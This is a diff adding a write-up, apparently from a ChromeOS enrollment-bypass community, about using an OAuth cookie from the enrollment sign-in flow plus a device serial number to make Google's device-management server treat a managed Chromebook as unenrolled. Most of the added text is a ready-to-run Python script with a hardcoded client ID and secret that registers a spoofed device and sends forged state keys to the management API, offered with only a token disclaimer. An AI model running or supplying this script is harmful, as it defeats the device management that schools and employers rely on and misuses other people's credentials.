@@ -44,3 +44,95 @@ update: `hd=*`: Forces Google to ask for an account from any managed Google Work
 none of the URLs above, by themselves, prove that the DI can be bypassed. the important part is that `hd` is supplied as part of the ChromeOS device-enrollment sign-in flow. changing it would require control over the OOBE webview/navigation rather than simply editing a normal browser URL.
 
 recovery in chromeos webview: https://accounts.google.com/v3/signin/recoveryidentifier?flowName=GlifSetupChromeOs&dsh=S-368440106%3A1787169239399889
+
+one of the coolest things to edit enrollment state that I found was that when going to the url, it gives a cookie which chromeos can use to intrepert the user signing into  a managed device. this means if we inspect and grab the cookie that contains something like "oauth code" we could have a script with websocket access prevent enrollment on a device by getting its serial # and using the cookie to manipulate the management into thinking the specific account doesn't require enrollment on the device with that serial, leading to serverside unenrollment, essentially!
+
+** ok, I just heard that someone just found this and I'm completely uncredited. here is the script they wrote for my theory to work. open a compiler that supports python and run this. please do not do this on an unauthorized device, I do not encourage that. this is just a cool little thing.
+
+``
+import uuid
+import time
+import requests
+import os
+import device_management_backend_pb2 as proto
+
+serial_number = input("serial number: (REMOVE THESE PARANTHESES AND WRITE YOUR SERIAL NUMBER HERE)").strip()
+oauth_code = input("oauth code: (REMOVE THESE PARANTHESES AND WRITE THE COOKIE FROM THAT LINK HERE)").strip()
+
+response = requests.post(
+    "https://www.googleapis.com/oauth2/v4/token",
+    data={
+        "code": oauth_code,
+        "client_id": "77185425430.apps.googleusercontent.com",
+        "client_secret": "OTJgUOQcT7lO7GsGZq2G4IlT",
+        "grant_type": "authorization_code",
+    },
+)
+
+response.raise_for_status()
+refresh_token = response.json()["refresh_token"]
+
+response = requests.post(
+    "https://www.googleapis.com/oauth2/v4/token",
+    data={
+        "client_id": "77185425430.apps.googleusercontent.com",
+        "client_secret": "OTJgUOQcT7lO7GsGZq2G4IlT",
+        "grant_type": "refresh_token",
+        "refresh_token": refresh_token,
+        "scope": "https://www.googleapis.com/auth/chromeosdevicemanagement https://www.googleapis.com/auth/userinfo.email",
+    },
+)
+
+response.raise_for_status()
+oauth_token = response.json()["access_token"]
+
+device_id = str(uuid.uuid4())
+
+register_request = proto.DeviceRegisterRequest()
+register_request.type = proto.DeviceRegisterRequest.DEVICE
+register_request.machine_id = serial_number
+
+request = proto.DeviceManagementRequest()
+request.register_request.CopyFrom(register_request)
+
+response = requests.post(
+    f"https://m.google.com/devicemanagement/data/api?devicetype=2&apptype=Chrome&request=register&deviceid={device_id}&oauth_token={oauth_token}",
+    headers={
+        "Content-Type": "application/protobuf",
+    },
+    data=request.SerializeToString(),
+)
+
+data = proto.DeviceManagementResponse()
+data.ParseFromString(response.content)
+
+if data.error_message:
+    exit(f"registration error: {data.error_message}")
+
+dmtoken = data.register_response.device_management_token
+
+policy_fetch_request = proto.PolicyFetchRequest()
+policy_fetch_request.policy_type = "google/chromeos/device"
+
+state_key_update_request = proto.DeviceStateKeyUpdateRequest()
+for _ in range(5):
+    state_key_update_request.server_backed_state_keys.append(os.urandom(32))
+
+request = proto.DeviceManagementRequest()
+request.policy_request.requests.append(policy_fetch_request)
+request.device_state_key_update_request.CopyFrom(state_key_update_request)
+
+response = requests.post(
+    f"https://m.google.com/devicemanagement/data/api?retry=false&apptype=Chrome&deviceid={device_id}&devicetype=2&request=policy",
+    headers={
+        "Authorization": f"GoogleDMToken token={dmtoken}",
+        "Content-Type": "application/protobuf",
+    },
+    data=request.SerializeToString(),
+)
+
+data = proto.DeviceManagementResponse()
+data.ParseFromString(response.content)
+
+print(data)
+``
